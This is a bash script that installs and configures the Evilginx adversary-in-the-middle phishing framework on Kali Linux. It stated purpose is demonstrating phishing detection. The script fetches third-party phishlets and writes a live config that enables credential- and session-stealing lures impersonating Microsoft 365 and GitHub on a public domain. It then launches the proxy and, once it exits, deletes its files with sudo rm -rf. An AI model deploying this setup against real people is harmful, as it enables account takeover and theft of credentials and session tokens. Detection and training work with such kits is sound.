#! /bin/bash

##################################################################################
# All-in-one EVILGINX3 script for Kali rolling
##################################################################################
# Use Case:     Intended to demoing MITM phishing kits detection and prevention
#               with Adv. URL Filtering and ML Inline Cloud Analysis
# Description:  This script install and prepares all the needed packages.
#               It also set up 2 phishing sites for MS365 and GITHUB
# Requirements:
#               - Kali rolling up to date system
#               - This VM needs to have a public IP address (or NATed ports)
#               - This VM needs to have these ports open/NATed: UDP/53, TCP/443
#               - Create a public domain/subdomain and point its NS entry to this
#                 VM public IP address for example:
#                    ; phisher.myown.tools.     NS    ns.phisher.myown.tools.
#                    ; ns.phisher.myown.tools.  A     <PUBLIC_IP_ADDRESS>
#               - Set the "domain" variable below to your domain/subdomain
#                    ; domain="phisher.myown.tools"
#               - Run this script with a regular user with SUDO privileges
##################################################################################

##################################################################################
# CUSTOM VARIABLES
##################################################################################
export domain
if [ -z ${domain+x} ]; then
  domain="phisher.myown.tools"
fi
dest_dir="evilginx3"
##################################################################################

##################################################################################
##################################################################################
# IT IS NOT NECESSARY TO CHANGE ANYTHING BELOW THIS LINE
##################################################################################
##################################################################################

##################################################################################
# Define the needed repositories and print base setup
##################################################################################

go_url="https://go.dev/dl/go1.20.6.linux-amd64.tar.gz"

evilginx3_repo="https://github.com/kgretzky/evilginx2.git"
phishlets_repo1="https://github.com/BakkerJan/evilginx2.git"
phishlets_repo2="https://github.com/An0nUD4Y/Evilginx2-Phishlets.git"
##################################################################################

##################################################################################
# Installing and compiling all the needed parts
##################################################################################
mkdir "${dest_dir}"
echo
echo -n "INSTALLING REQUIRED SYSTEM PKGs..."
sudo apt -y update &> /dev/null
sudo apt -y full-upgrade &> /dev/null
sudo apt -y install make git curl socat &> /dev/null
echo " OK"

echo
echo -n "INSTALLING GOLANG..."
wget -O /tmp/go.tar.gz "${go_url}" &> /dev/null
cd /usr/local
sudo tar zxf /tmp/go.tar.gz &> /dev/null
rm /tmp/go.tar.gz
export PATH="${PATH}:/usr/local/go/bin"
cd - &> /dev/null
echo " OK"

echo
echo -n "GIT CLONE OFFICIAL EVILGINX REPOSITORY..."
git clone --depth=1 "${evilginx3_repo}" "${dest_dir}.temporal" &> /dev/null
rm -rf "${dest_dir}/.git" "${dest_dir}/phishlets" &> /dev/null
echo " OK"

echo
echo -n "COMPILING EVILGINX3..."
cd "${dest_dir}.temporal"
make
cp ./build/evilginx "../${dest_dir}/"
cd ..
rm -rf "${dest_dir}.temporal" &> /dev/null
echo " OK"

echo
echo -n "GIT CLONE PHISHLETS FROM BakkerJan..."
cd "${dest_dir}"
git init &> /dev/null
git remote add -f origin "${phishlets_repo1}" &> /dev/null
git config core.sparseCheckout true &> /dev/null
echo "/phishlets/" > .git/info/sparse-checkout
git pull origin master &> /dev/null
rm -rf .git* &> /dev/null
echo " OK"

echo
echo -n "GIT CLONE PHISHLETS FROM An0nUD4Y..."
git clone "${phishlets_repo2}" &> /dev/null
echo " OK"
##################################################################################

##################################################################################
# Prepare EVILGINX3 config
##################################################################################
export ip="$(curl -s https://api.ipify.org)"
echo "PUBLIC IP: ${ip}"
echo "BASE DNS DOMAIN: ${domain}"

echo -n "CREATING CONFIG:"
export o365="$(curl -s "https://random-word-api.herokuapp.com/word?length=5" | cut -d\" -f2).${domain}"
export github="$(curl -s "https://random-word-api.herokuapp.com/word?length=5" | cut -d\" -f2).${domain}"

export rpath_o365="/$(cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-100} | head -n 1 | cut -c1-8)"
export rpath_github="/$(cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-100} | head -n 1 | cut -c1-8)"

sudo -s << _COMMAND_
mkdir -p /root/.evilginx &> /dev/null
cat > /root/.evilginx/config.json << _EOF_
{
  "blacklist": {
    "mode": "unauth"
  },
  "general": {
    "domain": "${domain}",
    "ipv4": "",
    "external_ipv4": "${ip}",
    "bind_ipv4": "",
    "redirect_url": "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
    "https_port": 443,
    "dns_port": 53
  },
  "lures": [
    {
      "hostname": "",
      "path": "${rpath_o365}",
      "redirect_url": "https://portal.office.com",
      "phishlet": "o365",
      "redirector": "",
      "ua_filter": "",
      "info": "",
      "og_title": "",
      "og_desc": "",
      "og_image": "",
      "og_url": ""
    },
    {
      "hostname": "",
      "path": "${rpath_github}",
      "redirect_url": "https://www.github.com",
      "phishlet": "github",
      "redirector": "",
      "ua_filter": "",
      "info": "",
      "og_title": "",
      "og_desc": "",
      "og_image": "",
      "og_url": ""
    }
  ],
  "phishlets": {
    "o365": {
      "hostname": "${o365}",
      "enabled": true,
      "visible": true
    },
    "github": {
      "hostname": "${github}",
      "enabled": true,
      "visible": true
    }
  }
}
_EOF_
_COMMAND_
echo " OK"
##################################################################################

##################################################################################
# Prepare EVILGINX3 run script
##################################################################################
echo
echo "RUN COMMAND: ./evilginx3.run"
cat > ../evilginx3.run << _EOF_
#! /bin/sh

export PATH="\${PATH}:/usr/local/go/bin"

echo "\$(dirname \${0})/evilginx3/evilginx -p \$(dirname \${0})/evilginx3/phishlets"
sudo \$(dirname \${0})/evilginx3/evilginx -p \$(dirname \${0})/evilginx3/phishlets
_EOF_
chmod 755 ../evilginx3.run
##################################################################################

##################################################################################
# Prepare EVILGINX3 clean script
##################################################################################
echo
echo "CLEAN UP COMMAND: sudo rm -rf /usr/local/go evilginx3 evilginx3.run go .evilginx /root/.evilginx evilginx3.clean"
cat > ../evilginx3.clean << _EOF_
#! /bin/bash

sudo rm -rf /usr/local/go evilginx3 evilginx3.run go .evilginx /root/.evilginx evilginx3.clean
_EOF_
chmod 755 ../evilginx3.clean
echo
cd ..
##################################################################################

##################################################################################
# Run EVILGINX3 and after it exits, cleanup all the stuff
##################################################################################
./evilginx3.run
./evilginx3.clean
##################################################################################
